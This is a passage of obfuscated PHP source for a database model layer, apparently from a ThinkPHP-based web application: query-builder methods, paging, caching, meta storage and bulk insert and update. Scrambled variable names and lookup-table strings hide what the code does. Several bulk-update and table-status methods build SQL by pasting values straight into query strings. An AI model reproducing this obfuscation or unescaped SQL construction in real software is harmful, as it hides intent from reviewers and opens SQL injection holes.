(empty($Ò÷úœ¬Í)) { return $this; } if ($ŞÍî—‰à) { $this->options[$¨ãç±ç[400]][$¨ãç±ç[401]] = !0; } if (is_object($Ò÷úœ¬Í)) { $Ò÷úœ¬Í = get_object_vars($Ò÷úœ¬Í); } if (is_string($Ò÷úœ¬Í)) { $Ú¶¿×š = $Ò÷úœ¬Í; } elseif (is_array($Ò÷úœ¬Í)) { if (isset($Ò÷úœ¬Í[0])) { $this->options[$¨ãç±ç[400]] = array_merge($this->options[$¨ãç±ç[400]], $Ò÷úœ¬Í); return $this; } else { $Ú¶¿×š = $Ò÷úœ¬Í; } } else { think_exception(think_lang($¨ãç±ç[324])); } $this->options[$¨ãç±ç[400]][] = $Ú¶¿×š; return $this; } public function cache($¾º´¾üÎ = true, $æŞ„¸€ = null, $şßÀíè´ = '') { $¿û–ËÊ =& $_SERVER[ú÷îèÆÜ]; if (!1 !== $¾º´¾üÎ) { $this->options[$¿û–ËÊ[402]] = array($¿û–ËÊ[104] => $¾º´¾üÎ, $¿û–ËÊ[392] => $æŞ„¸€, $¿û–ËÊ[43] => $şßÀíè´); } return $this; } public function field($Ø‘•ÈÂì, $ ĞŠÕÖŒ = false) { $í×¾³±‚ =& $_SERVER[ú÷îèÆÜ]; if (!0 === $Ø‘•ÈÂì) { $‰›û‘§ = $this->getDbFields(); $Ø‘•ÈÂì = $‰›û‘§ ? $‰›û‘§ : $í×¾³±‚[213]; } elseif ($ ĞŠÕÖŒ) { if (is_string($Ø‘•ÈÂì)) { $Ø‘•ÈÂì = explode($í×¾³±‚[60], $Ø‘•ÈÂì); } $‰›û‘§ = $this->getDbFields(); $Ø‘•ÈÂì = $‰›û‘§ ? array_diff($‰›û‘§, $Ø‘•ÈÂì) : $Ø‘•ÈÂì; } $this->options[$í×¾³±‚[326]] = $Ø‘•ÈÂì; return $this; } public function scope($ ŠáŒ½ = '', $¾äâëÓ = NULL) { $”ˆ¯µ¤Ø =& $_SERVER[ú÷îèÆÜ]; if ($”ˆ¯µ¤Ø[22] === $ ŠáŒ½) { if (isset($this->_scope[$”ˆ¯µ¤Ø[47]])) { $ª© ³¹ı = $this->_scope[$”ˆ¯µ¤Ø[47]]; } else { return $this; } } elseif (is_string($ ŠáŒ½)) { $·®ØŞíÌ = explode($”ˆ¯µ¤Ø[60], $ ŠáŒ½); $ª© ³¹ı = array(); foreach ($·®ØŞíÌ as $– °ïı´) { if (!isset($this->_scope[$– °ïı´])) { continue; } $ª© ³¹ı = array_merge($ª© ³¹ı, $this->_scope[$– °ïı´]); } if (!empty($¾äâëÓ) && is_array($¾äâëÓ)) { $ª© ³¹ı = array_merge($ª© ³¹ı, $¾äâëÓ); } } elseif (is_array($ ŠáŒ½)) { $ª© ³¹ı = $ ŠáŒ½; } if (is_array($ª© ³¹ı) && !empty($ª© ³¹ı)) { $this->options = array_merge($this->options, array_change_key_case($ª© ³¹ı)); } return $this; } public function where($ Ñ˜Ñ…«, $‚ô†±å = null) { $ãÛŒØĞÆ =& $_SERVER[ú÷îèÆÜ]; if (!is_null($‚ô†±å) && is_string($ Ñ˜Ñ…«)) { if (!is_array($‚ô†±å)) { $‚ô†±å = func_get_args(); array_shift($‚ô†±å); } $‚ô†±å = array_map(array($this->db, $ãÛŒØĞÆ[396]), $‚ô†±å); $ Ñ˜Ñ…« = vsprintf($ Ñ˜Ñ…«, $‚ô†±å); } elseif (is_object($ Ñ˜Ñ…«)) { $ Ñ˜Ñ…« = get_object_vars($ Ñ˜Ñ…«); } elseif (is_array($ Ñ˜Ñ…«)) { foreach ($ Ñ˜Ñ…« as $ÓÚå˜ê => $ÌµÃïàï) { if ((is_numeric($ÓÚå˜ê) || !$ÓÚå˜ê) && is_string($ÌµÃïàï)) { if (strpos($ÌµÃïàï, $ãÛŒØĞÆ[403]) === 0) { continue; } think_trace($ãÛŒØĞÆ[404], $ãÛŒØĞÆ[22], $ãÛŒØĞÆ[59]); die; } } } if (is_string($ Ñ˜Ñ…«) && $ãÛŒØĞÆ[22] != $ Ñ˜Ñ…«) { $áû¡Óéî = array(); $áû¡Óéî[$ãÛŒØĞÆ[405]] = $ Ñ˜Ñ…«; $ Ñ˜Ñ…« = $áû¡Óéî; } if (isset($this->options[$ãÛŒØĞÆ[328]])) { $this->options[$ãÛŒØĞÆ[328]] = array_merge($this->options[$ãÛŒØĞÆ[328]], $ Ñ˜Ñ…«); } else { $this->options[$ãÛŒØĞÆ[328]] = $ Ñ˜Ñ…«; } return $this; } public function limit($ÇÒûÅ±ï, $ê¶×µƒœ = null) { $º±Ñ¸‰ì =& $_SERVER[ú÷îèÆÜ]; $this->options[$º±Ñ¸‰ì[345]] = is_null($ê¶×µƒœ) ? $ÇÒûÅ±ï : $ÇÒûÅ±ï . $º±Ñ¸‰ì[60] . $ê¶×µƒœ; return $this; } public function page($³™¶æãá, $¢ŸôÄÎ¤ = null) { $ŠÅ£ŠˆÌ =& $_SERVER[ú÷îèÆÜ]; $this->options[$ŠÅ£ŠˆÌ[406]] = is_null($¢ŸôÄÎ¤) ? $³™¶æãá : $³™¶æãá . $ŠÅ£ŠˆÌ[60] . $¢ŸôÄÎ¤; return $this; } public function comment($™ìÔáÎÂ) { $this->options[$_SERVER[ú÷îèÆÜ][407]] = $™ìÔáÎÂ; return $this; } public function setProperty($ì¨´‚—Œ, $ÒàÍˆñ) { if (property_exists($this, $ì¨´‚—Œ)) { $this->{$ì¨´‚—Œ} = $ÒàÍˆñ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\171\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\156\x73\145\x72\164\x2c\x75\160\x64\141\x74\x65", "\146\x75\x6e\143\x74\151\x6f\156"), array("\x63\162\145\141\x74\x65\x54\151\155\145", "\164\x69\x6d\x65", "\151\x6e\x73\x65\162\164", "\x66\165\156\143\x74\151\x6f\x6e")); public function setDataAuto($İÈúåÓ) { $this->dataAuto = $İÈúåÓ; } public function __construct($Õ‘†ª¶· = '', $µ£“‚ ¡ = '', $Ş¨íñÁŒ = '') { parent::__construct($Õ‘†ª¶·, $µ£“‚ ¡, $Ş¨íñÁŒ); } protected $tableMeta = array(); protected function _beforeInsert(&$ë·‡…ä, $ğÖÕÌ¬) { $Ä™í¤Ğö =& $_SERVER[ú÷îèÆÜ]; if (!$this->checkDataAutoHas($Ä™í¤Ğö[408])) { return; } $this->dataBeforeFilter($ë·‡…ä, $Ä™í¤Ğö[408]); } protected function _beforeUpdate(&$¨¨¡œéŒ, $ş¼Í—–ø) { $™æ¬¿˜¨ =& $_SERVER[ú÷îèÆÜ]; if (!$this->checkDataAutoHas($™æ¬¿˜¨[409])) { return; } $this->dataBeforeFilter($¨¨¡œéŒ, $™æ¬¿˜¨[409]); } protected function _afterSelect(&$õºÌö€«, $×‡ñè¶Ê) { if (!is_array($õºÌö€«)) { return; } if (!$this->checkDataAutoHas($_SERVER[ú÷îèÆÜ][410])) { return; } foreach ($õºÌö€« as &$ñÌ–Ïı) { $this->dataAfterFilter($ñÌ–Ïı); } unset($ñÌ–Ïı); } protected function _afterFind(&$ÃòÇÛê, $öôöÏäÕ) { if (!is_array($ÃòÇÛê)) { return; } if (!$this->checkDataAutoHas($_SERVER[ú÷îèÆÜ][410])) { return; } $this->dataAfterFilter($ÃòÇÛê); } public static function textEncode($ò“·¤¢Ö) { if (!$ò“·¤¢Ö) { return $ò“·¤¢Ö; } $„£ğ¯ Ë = json_encode($ò“·¤¢Ö); $„£ğ¯ Ë = preg_replace_callback($_SERVER[ú÷îèÆÜ][411], function ($­’Ÿ£µ¡) { return addslashes($­’Ÿ£µ¡[0]); }, $„£ğ¯ Ë); return json_decode($„£ğ¯ Ë); } public static function textDecode($Ì´ˆçä·) { $ìÈÚÕßá =& $_SERVER[ú÷îèÆÜ]; $‰—Ê§§ = json_encode($Ì´ˆçä·); $‰—Ê§§ = preg_replace_callback($ìÈÚÕßá[412], function ($“¨ñØâĞ) { return $_SERVER[ú÷îèÆÜ][107]; }, $‰—Ê§§); return json_decode($‰—Ê§§); } public function setAutoIncrement($Ò…·¿èö) { $ó­Í±ÉÏ = array($this->getPk() => $Ò…·¿èö); $ÃÅ÷—Ê = $this->data($ó­Í±ÉÏ)->add(); if ($ÃÅ÷—Ê) { $this->delete($ÃÅ÷—Ê); } } public function getAutoIncrement() { $¥–Ñ÷à¡ = $this->getTableName(); $óà Æ– = $this->max($this->getPk()); $ö¿¬—ÚÙ = $this->query("\x73\x68\x6f\x77\40\164\x61\x62\x6c\145\40\163\164\141\164\x75\x73\40\167\x68\145\x72\145\x20\x4e\141\155\145\75\x27{$¥–Ñ÷à¡}\47"); $˜ŒÕßŸõ = $ö¿¬—ÚÙ[0][$_SERVER[ú÷îèÆÜ][413]]; $ÃÏºôÕİ = max($óà Æ–, $˜ŒÕßŸõ); return $ÃÏºôÕİ; } protected function _callBefore($®“¹ÂÕ, $ßßÑ¾Â£) { return $this->cacheCallCheck($®“¹ÂÕ, $ßßÑ¾Â£, !1); } protected function _callAfter($ØÃÚóÒ¼, $‚÷Éïğ) { return $this->cacheCallCheck($ØÃÚóÒ¼, $‚÷Éïğ, !0); } protected function cacheFunctionAlias($äÇ˜Ññ¬) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($’°›ÁŸ‹, $ş®‹åÉ, $Ùµ“É‰¤ = false) { $ÙæÑ‰Û• = $this->cacheFunctionAlias($ş®‹åÉ); if (!$ÙæÑ‰Û•) { return; } foreach ($ÙæÑ‰Û• as $×Á×ğç€ => $Ââğ‰ûÍ) { $Ô ãşéË = $Ââğ‰ûÍ[0]; $üôØÍä = explode($_SERVER[ú÷îèÆÜ][60], $Ââğ‰ûÍ[1]); if ($’°›ÁŸ‹ == $×Á×ğç€) { return $this->cacheFunctionGet($×Á×ğç€, $Ô ãşéË); } if ($Ùµ“É‰¤ && in_array($’°›ÁŸ‹, $üôØÍä)) { $this->cacheFunctionClear($×Á×ğç€, $Ô ãşéË); } } } public function cacheFunctionGet($¦£Ìƒı, $’óá’×) { $¶–ñ“¸£ = $this->cacheKeyMake($¦£Ìƒı, $’óá’×); $ùšé¬µŠ = Cache::get($¶–ñ“¸£); if (!is_array($ùšé¬µŠ)) { $ùšé¬µŠ = call_user_func_array(array($this, $¦£Ìƒı), array($’óá’×, !0)); Cache::set($¶–ñ“¸£, $ùšé¬µŠ); } return $ùšé¬µŠ; } public function cacheFunctionClear($èñî½¨¸, $ÚËÌ•éâ) { $Ü…ñ³³• = $ÚËÌ•éâ; if (!is_array($ÚËÌ•éâ)) { $Ü…ñ³³• = array($ÚËÌ•éâ); } foreach ($Ü…ñ³³• as $¹¾ô½©Ä) { $Öá“øÉ‹ = $this->cacheKeyMake($èñî½¨¸, $¹¾ô½©Ä); Cache::remove($Öá“øÉ‹); } } private function cacheKeyMake($®éŸ»æ¸, $ÒŸ„ƒŸö) { $û§Òô“¹ =& $_SERVER[ú÷îèÆÜ]; return get_class($this) . $û§Òô“¹[21] . $®éŸ»æ¸ . $û§Òô“¹[414] . $ÒŸ„ƒŸö; } protected function selectPageReset() { $ƒĞë±…  =& $_SERVER[ú÷îèÆÜ]; if (isset($GLOBALS[$ƒĞë±… [415]])) { return; } $GLOBALS[$ƒĞë±… [415]] = isset($GLOBALS[$ƒĞë±… [17]][$ƒĞë±… [416]]) ? $GLOBALS[$ƒĞë±… [17]][$ƒĞë±… [416]] : !1; $GLOBALS[$ƒĞë±… [417]] = isset($GLOBALS[$ƒĞë±… [17]][$ƒĞë±… [406]]) ? $GLOBALS[$ƒĞë±… [17]][$ƒĞë±… [406]] : !1; $GLOBALS[$ƒĞë±… [17]][$ƒĞë±… [416]] = !1; $GLOBALS[$ƒĞë±… [17]][$ƒĞë±… [406]] = !1; } protected function selectPageRestore() { $ĞÆ…Øß› =& $_SERVER[ú÷îèÆÜ]; if (!isset($GLOBALS[$ĞÆ…Øß›[415]])) { return; } $GLOBALS[$ĞÆ…Øß›[17]][$ĞÆ…Øß›[416]] = $GLOBALS[$ĞÆ…Øß›[415]]; $GLOBALS[$ĞÆ…Øß›[17]][$ĞÆ…Øß›[406]] = $GLOBALS[$ĞÆ…Øß›[417]]; if ($GLOBALS[$ĞÆ…Øß›[17]][$ĞÆ…Øß›[416]] === !1) { unset($GLOBALS[$ĞÆ…Øß›[17]][$ĞÆ…Øß›[416]]); } if ($GLOBALS[$ĞÆ…Øß›[17]][$ĞÆ…Øß›[406]] === !1) { unset($GLOBALS[$ĞÆ…Øß›[17]][$ĞÆ…Øß›[406]]); } unset($GLOBALS[$ĞÆ…Øß›[415]]); unset($GLOBALS[$ĞÆ…Øß›[417]]); } protected function selectPage($µÅ„Çğ = 200, $è¶ÁåÛ¡ = 1) { $¿í®½û =& $_SERVER[ú÷îèÆÜ]; global $in; $Èï×ø¯• = $this->optionsValue(); $óçÀÀƒ² = 50000; $µÅ„Çğ = isset($in[$¿í®½û[416]]) && $in[$¿í®½û[416]] ? $in[$¿í®½û[416]] : $µÅ„Çğ; if ($µÅ„Çğ === -1) { $in[$¿í®½û[416]] = !1; $óçÀÀƒ² = 100000000; $µÅ„Çğ = $óçÀÀƒ²; } $ñ÷àóÙŞ = $Èï×ø¯•; $ñ÷àóÙŞ[$¿í®½û[418]] = array(); $µÅ„Çğ = intval($µÅ„Çğ); $µÅ„Çğ = $µÅ„Çğ <= 5 ? 5 : ($µÅ„Çğ >= $óçÀÀƒ² ? $óçÀÀƒ² : $µÅ„Çğ); $è¶ÁåÛ¡ = intval(isset($in[$¿í®½û[406]]) && $in[$¿í®½û[406]] ? $in[$¿í®½û[406]] : $è¶ÁåÛ¡); $è¶ÁåÛ¡ = $è¶ÁåÛ¡ <= 1 ? 1 : $è¶ÁåÛ¡; $§¥ıüõ¤ = array(); $óŠ®Ş¯‡ = 1; if ($è¶ÁåÛ¡ == 1 && $óŠ®Ş¯‡) { $this->optionsValue($Èï×ø¯•); $§¥ıüõ¤ = $this->page($è¶ÁåÛ¡, $µÅ„Çğ)->select(); $È±ˆ“ = is_array($§¥ıüõ¤) ? count($§¥ıüõ¤) : 0; if ($È±ˆ“ < $µÅ„Çğ) { $¤Ğ¾¯¯ = 1; } else { $this->optionsValue($ñ÷àóÙŞ); $È±ˆ“ = intval($this->count()); $¤Ğ¾¯¯ = ceil($È±ˆ“ / $µÅ„Çğ); } } else { $this->optionsValue($ñ÷àóÙŞ); $È±ˆ“ = intval($this->count()); $¤Ğ¾¯¯ = ceil($È±ˆ“ / $µÅ„Çğ); $è¶ÁåÛ¡ = $è¶ÁåÛ¡ >= $¤Ğ¾¯¯ ? $¤Ğ¾¯¯ : $è¶ÁåÛ¡; $this->optionsValue($Èï×ø¯•); $§¥ıüõ¤ = $this->page($è¶ÁåÛ¡, $µÅ„Çğ)->select(); } if (!is_array($§¥ıüõ¤)) { $§¥ıüõ¤ = array(); } if ($¤Ğ¾¯¯ == 1) { $È±ˆ“ = count($§¥ıüõ¤); } $âº²ãâæ = array($¿í®½û[419] => array($¿í®½û[420] => $È±ˆ“, $¿í®½û[416] => $µÅ„Çğ, $¿í®½û[406] => $è¶ÁåÛ¡, $¿í®½û[421] => $¤Ğ¾¯¯), $¿í®½û[422] => $§¥ıüõ¤); return $âº²ãâæ; } protected function checkLength($±Ûî°ÑÔ, $Ó¢‡‹à = 0, $ö÷ŠÄï“ = '') { $ĞœâÇŞ³ =& $_SERVER[ú÷îèÆÜ]; $Ó¢‡‹à = $Ó¢‡‹à ? $Ó¢‡‹à : 65536; if (!$±Ûî°ÑÔ || strlen($±Ûî°ÑÔ) < $Ó¢‡‹à) { return; } $ö÷ŠÄï“ = $ö÷ŠÄï“ ? $ö÷ŠÄï“ . $ĞœâÇŞ³[81] : $ĞœâÇŞ³[22]; show_json($ö÷ŠÄï“ . LNG($ĞœâÇŞ³[423]) . "\50{$Ó¢‡‹à}\x29", !1); } protected function metaSet($ùÙæÉÖ…, $º¯ ˜”Û = null, $„¾õàÜ£ = null) { $Û–´–›÷ =& $_SERVER[ú÷îèÆÜ]; if (!$this->tableMeta || !$ùÙæÉÖ…) { return !1; } $ÂÊ›ïÔ£ = $this->tableMeta[$Û–´–›÷[424]]; $€ñÚ¸ŞÔ = $this->tableMeta[$Û–´–›÷[425]]; $ÍéØ÷†û = Model($€ñÚ¸ŞÔ); $üæñÁø‡ = array($ÂÊ›ïÔ£ => $ùÙæÉÖ…, $Û–´–›÷[426] => $º¯ ˜”Û); if (is_null($º¯ ˜”Û)) { return $ÍéØ÷†û->where(array($ÂÊ›ïÔ£ => $ùÙæÉÖ…))->delete(); } if (is_null($„¾õàÜ£) && is_string($º¯ ˜”Û)) { return $ÍéØ÷†û->where($üæñÁø‡)->delete(); } $Û÷’¤äü = is_array($º¯ ˜”Û) ? $º¯ ˜”Û : array(); if (is_string($º¯ ˜”Û)) { $Û÷’¤äü[$º¯ ˜”Û] = $„¾õàÜ£; } $…¢ï„¾Ï = array(); foreach ($Û÷’¤äü as $ÆÍ‡ñ½Ê => $×™ÃÈùí) { if (is_null($×™ÃÈùí) && is_string($ÆÍ‡ñ½Ê)) { $ÍéØ÷†û->where(array($ÂÊ›ïÔ£ => $ùÙæÉÖ…, $Û–´–›÷[426] => $ÆÍ‡ñ½Ê))->delete(); continue; } $this->checkLength($×™ÃÈùí, !1, $€ñÚ¸ŞÔ . $Û–´–›÷[4] . $ÆÍ‡ñ½Ê); $…¢ï„¾Ï[] = array($ÂÊ›ïÔ£ => $ùÙæÉÖ…, $Û–´–›÷[104] => $ÆÍ‡ñ½Ê, $Û–´–›÷[427] => $×™ÃÈùí); } $‘§±ìóè = $Û–´–›÷[428] . $€ñÚ¸ŞÔ; CacheLock::lock($‘§±ìóè); $ÍéØ÷†û->where(array($ÂÊ›ïÔ£ => $ùÙæÉÖ…))->addAll($…¢ï„¾Ï, array(), !0); CacheLock::unlock($‘§±ìóè); return !0; } public function metaGet($ŞÂÍ±‹°, $œ¬¯Ú·Â = false) { $ã•«ÛºÅ =& $_SERVER[ú÷îèÆÜ]; if (!$this->tableMeta) { return array(); } $¶¨¾Ôã£ = $this->tableMeta[$ã•«ÛºÅ[424]]; $™ÅÃöËÍ = Model($this->tableMeta[$ã•«ÛºÅ[425]]); if ($œ¬¯Ú·Â) { $°§öËÍÕ = array($¶¨¾Ôã£ => $ŞÂÍ±‹°, $ã•«ÛºÅ[104] => $œ¬¯Ú·Â); return $™ÅÃöËÍ->where($°§öËÍÕ)->getField($ã•«ÛºÅ[427]); } $°§öËÍÕ = array($¶¨¾Ôã£ => $ŞÂÍ±‹°); $â‚ŒÏ = $™ÅÃöËÍ->field($ã•«ÛºÅ[429])->where($°§öËÍÕ)->select(); $â‚ŒÏ = array_to_keyvalue($â‚ŒÏ, $ã•«ÛºÅ[104], $ã•«ÛºÅ[427]); return $â‚ŒÏ; } private function checkDataAutoHas($ÓĞîÜ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $‘ô«—£–) { if (in_array($ÓĞîÜ, explode($_SERVER[ú÷îèÆÜ][60], $‘ô«—£–[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÛºÈã­‚, $µ´ŠÏÈô) { $Šø¹¬İŒ =& $_SERVER[ú÷îèÆÜ]; if (!is_array($ÛºÈã­‚)) { return; } foreach ($this->dataAuto as $¬ŸÆ”êõ) { $×ÚÊÈ¡° = $¬ŸÆ”êõ[0]; if (!in_array($µ´ŠÏÈô, explode($Šø¹¬İŒ[60], $¬ŸÆ”êõ[2]))) { continue; } switch (trim($¬ŸÆ”êõ[3])) { case $Šø¹¬İŒ[374]: case $Šø¹¬İŒ[375]: $óßó = $¬ŸÆ”êõ[1]; $Ò¡¸¤Ê„ = isset($¬ŸÆ”êõ[4]) ? (array) $¬ŸÆ”êõ[4] : array(); if ($óßó == $Šø¹¬İŒ[204] && array_key_exists($×ÚÊÈ¡°, $ÛºÈã­‚)) { if (!$ÛºÈã­‚[$×ÚÊÈ¡°]) { unset($ÛºÈã­‚[$×ÚÊÈ¡°]); } break; } if (isset($ÛºÈã­‚[$×ÚÊÈ¡°])) { array_unshift($Ò¡¸¤Ê„, $ÛºÈã­‚[$×ÚÊÈ¡°]); } if ($Šø¹¬İŒ[374] == $¬ŸÆ”êõ[3]) { $ÛºÈã­‚[$×ÚÊÈ¡°] = call_user_func_array($óßó, $Ò¡¸¤Ê„); } else { $ÛºÈã­‚[$×ÚÊÈ¡°] = call_user_func_array(array(&$this, $óßó), $Ò¡¸¤Ê„); } break; case $Šø¹¬İŒ[323]: if (isset($ÛºÈã­‚[$×ÚÊÈ¡°]) && $ÛºÈã­‚[$×ÚÊÈ¡°]) { $ÛºÈã­‚[$×ÚÊÈ¡°] = call_user_func_array(array(&$this, $¬ŸÆ”êõ[1]), array($ÛºÈã­‚[$×ÚÊÈ¡°])); } break; case $Šø¹¬İŒ[326]: $ÛºÈã­‚[$×ÚÊÈ¡°] = $ÛºÈã­‚[$¬ŸÆ”êõ[1]]; break; case $Šø¹¬İŒ[347]: if (isset($ÛºÈã­‚[$×ÚÊÈ¡°]) && !is_string($ÛºÈã­‚[$×ÚÊÈ¡°])) { $ÛºÈã­‚[$×ÚÊÈ¡°] = json_encode_force($ÛºÈã­‚[$×ÚÊÈ¡°]); } break; case $Šø¹¬İŒ[376]: if ($ÛºÈã­‚[$×ÚÊÈ¡°] === $Šø¹¬İŒ[22]) { unset($ÛºÈã­‚[$×ÚÊÈ¡°]); } break; case $Šø¹¬İŒ[377]: $ÛºÈã­‚[$×ÚÊÈ¡°] = $¬ŸÆ”êõ[1]; default: break; } } if ($µ´ŠÏÈô == $Šø¹¬İŒ[408]) { $…«‹ØÛø = strtolower($this->db->getDbType()); if (strpos($…«‹ØÛø, $Šø¹¬İŒ[23]) !== 0) { return; } $‘˜“Èó¦ = $this->field(!0)->fields; $˜³Œ¤Øæ = $‘˜“Èó¦[$Šø¹¬İŒ[305]]; if (isset($‘˜“Èó¦[$Šø¹¬İŒ[304]])) { unset($˜³Œ¤Øæ[$‘˜“Èó¦[$Šø¹¬İŒ[304]]]); } foreach ($˜³Œ¤Øæ as $ î¯ÊõÀ => $µ´ŠÏÈô) { if (!isset($ÛºÈã­‚[$ î¯ÊõÀ])) { $ÛºÈã­‚[$ î¯ÊõÀ] = $Šø¹¬İŒ[22]; } } } } private function dataAfterFilter(&$¹äòõô¦) { $ÁÍêÆ°ñ =& $_SERVER[ú÷îèÆÜ]; foreach ($this->dataAuto as $Úù°×šı) { $Â‡ÈÃÛÙ = $Úù°×šı[0]; if (!isset($¹äòõô¦[$Â‡ÈÃÛÙ])) { continue; } if (!in_array($ÁÍêÆ°ñ[410], explode($ÁÍêÆ°ñ[60], $Úù°×šı[2]))) { continue; } switch (trim($Úù°×šı[3])) { case $ÁÍêÆ°ñ[374]: case $ÁÍêÆ°ñ[375]: $áÉşÇ‹Ç = isset($Úù°×šı[4]) ? (array) $Úù°×šı[4] : array(); array_unshift($áÉşÇ‹Ç, $¹äòõô¦[$Â‡ÈÃÛÙ]); if (isset($Úù°×šı[4]) && $Úù°×šı[4] == $ÁÍêÆ°ñ[430]) { $áÉşÇ‹Ç = array($¹äòõô¦[$Â‡ÈÃÛÙ]); } if ($ÁÍêÆ°ñ[374] == $Úù°×šı[3]) { $¹äòõô¦[$Â‡ÈÃÛÙ] = call_user_func_array($Úù°×šı[1], $áÉşÇ‹Ç); } else { $¹äòõô¦[$Â‡ÈÃÛÙ] = call_user_func_array(array(&$this, $Úù°×šı[1]), $áÉşÇ‹Ç); } break; case $ÁÍêÆ°ñ[323]: if (isset($¹äòõô¦[$Â‡ÈÃÛÙ]) && $¹äòõô¦[$Â‡ÈÃÛÙ]) { $¹äòõô¦[$Â‡ÈÃÛÙ] = call_user_func_array(array(&$this, $Úù°×šı[1]), array($¹äòõô¦[$Â‡ÈÃÛÙ])); } break; case $ÁÍêÆ°ñ[326]: $¹äòõô¦[$Â‡ÈÃÛÙ] = $¹äòõô¦[$Úù°×šı[1]]; break; case $ÁÍêÆ°ñ[347]: $Á²¯‹ü = $¹äòõô¦[$Â‡ÈÃÛÙ]; $¹äòõô¦[$Â‡ÈÃÛÙ] = json_decode($Á²¯‹ü, !0); if (is_null($¹äòõô¦[$Â‡ÈÃÛÙ])) { $¹äòõô¦[$Â‡ÈÃÛÙ] = $Á²¯‹ü; } break; case $ÁÍêÆ°ñ[376]: if ($¹äòõô¦[$Â‡ÈÃÛÙ] === $ÁÍêÆ°ñ[22]) { unset($¹äòõô¦[$Â‡ÈÃÛÙ]); } break; case $ÁÍêÆ°ñ[377]: $¹äòõô¦[$Â‡ÈÃÛÙ] = $Úù°×šı[1]; break; default: break; } } } public function saveAll($ÁÉÑã) { $ŠÅÉ…¥© =& $_SERVER[ú÷îèÆÜ]; $Ö«¤¯ñ« = $this->tablePrefix . $this->tableName; $®É–òÍ = self::SQL_WHERE_IN_CHUNK; $ÁÉÑã = is_array($ÁÉÑã) ? $ÁÉÑã : array(); $µ·á£ÆÛ = $ŠÅÉ…¥©[431]; $ÇÚ‚¢ë™ = 0; $¬³êÅà… = array(); $–­–’Ó = count($ÁÉÑã); for ($çªˆ²½¥ = 0; $çªˆ²½¥ < $–­–’Ó; $çªˆ²½¥++) { $¸ ÂÆã— = $ÁÉÑã[$çªˆ²½¥]; if (!is_array($¸ ÂÆã—) || count($¸ ÂÆã—) != 4) { continue; } $åç­é·´ = "\125\x50\x44\101\124\105\x20\x60{$Ö«¤¯ñ«}\x60\40\123\105\124\40{$¸ ÂÆã—[2]}\40\x3d\x20\x43\101\123\x45\x20{$¸ ÂÆã—[0]}\x20\12"; if ($ÇÚ‚¢ë™ == 0) { $µ·á£ÆÛ = $åç­é·´; } $¬³êÅà…[] = $ŠÅÉ…¥©[128] . $¸ ÂÆã—[1] . $ŠÅÉ…¥©[128]; $ÇÚ‚¢ë™++; $µ·á£ÆÛ .= "\40\x57\x48\x45\x4e\x20\x27{$¸ ÂÆã—[1]}\x27\40\x54\110\x45\x4e\40\x27{$¸ ÂÆã—[3]}\47\x20\12"; if ($ÇÚ‚¢ë™ == $®É–òÍ || $çªˆ²½¥ == $–­–’Ó - 1) { $¶•ú‘³„ = implode($ŠÅÉ…¥©[60], $¬³êÅà…); $µ·á£ÆÛ .= "\x20\x45\116\104\40\40\127\110\x45\x52\105\x20{$¸ ÂÆã—[0]}\40\111\116\40\50{$¶•ú‘³„}\x29\x20"; $this->execute($µ·á£ÆÛ); $ÇÚ‚¢ë™ = 0; $µ·á£ÆÛ = $åç­é·´; $this->chunkEventCheck(count($¬³êÅà…)); $¬³êÅà… = array(); } } $this->chunkEventSet(); } public function saveAllEach($—¡ˆ¥èÒ) { $‘ßƒØ =& $_SERVER[ú÷îèÆÜ]; $ÁñåúÃ» = $this->tablePrefix . $this->tableName; foreach ($—¡ˆ¥èÒ as $ÜÏ‹‚Æ) { if (!is_array($ÜÏ‹‚Æ) || count($ÜÏ‹‚Æ) != 4) { continue; } $…ãİ»™ˆ = $ÜÏ‹‚Æ[0] . $‘ßƒØ[432] . $ÜÏ‹‚Æ[1] . $‘ßƒØ[128]; $Ã“¹Šéş = $ÜÏ‹‚Æ[2] . $‘ßƒØ[432] . $ÜÏ‹‚Æ[3] . $‘ßƒØ[128]; $ÂÈÖË“è = "\x75\160\144\x61\x74\145\x20{$ÁñåúÃ»}\x20\x73\x65\x74\x20{$Ã“¹Šéş}\40\167\150\x65\162\145\40{$…ãİ»™ˆ}\x3b"; $this->execute($ÂÈÖË“è); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($®áŸÓ„ó = false, $ÙÆŒ—Ù = false) { $this->_chunkEvent = $®áŸÓ„ó; $this->_chunkEventParam = $ÙÆŒ—Ù; } private function chunkEventCheck($Ö¼·€Ú) { if (!$this->_chunkEvent) { return; } $—“¾Ñú† = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $—“¾Ñú†[$_SERVER[ú÷îèÆÜ][433]] = $Ö¼·€Ú; Hook::trigger($this->_chunkEvent, $—“¾Ñú†); } public function addAll($€€ëú ı, $ÕÈó´ê™ = array(), $ïÄ¤Âú† = false) { $„—áÒ²¢ =& $_SERVER[ú÷îèÆÜ]; ignore_timeout(); $ÒºøÃÖ® = self::SQL_WHERE_IN_CHUNK; if (empty($€€ëú ı)) { $this->error = think_lang($„—áÒ²¢[324]); return !1; } $ÕÈó´ê™ = $this->_parseOptions($ÕÈó´ê™); foreach ($€€ëú ı as $ãÔ»­ƒî => $ÍİáİËì) { $€€ëú ı[$ãÔ»­ƒî] = $this->_facade($ÍİáİËì); $this->_beforeInsert($€€ëú ı[$ãÔ»­ƒî], $ÕÈó´ê™); } if (method_exists($this->db, $„—áÒ²¢[325])) { for ($½Äò÷ÃÖ = 0; $½Äò÷ÃÖ < count($€€ëú ı); $½Äò÷ÃÖ += $ÒºøÃÖ®) { $§ÈùÊ— = array_slice($€€ëú ı, $½Äò÷ÃÖ, $ÒºøÃÖ®); if (!is_array($§ÈùÊ—) || count($§ÈùÊ—) == 0) { break; } $÷ŸæÊÍø = $this->db->insertAll($§ÈùÊ—, $ÕÈó´ê™, $ïÄ¤Âú†); $this->chunkEventCheck(count($§ÈùÊ—)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($€€ëú ı as $ãÔ»­ƒî => $ÍİáİËì) { $÷ŸæÊÍø = $this->db->insert($ÍİáİËì, $ÕÈó´ê™, $ïÄ¤Âú†); } $this->commit(); } if (!1 !== $÷ŸæÊÍø) { $ö«ˆ‰ùÀ = $this->getLastInsID(); if ($ö«ˆ‰ùÀ) { 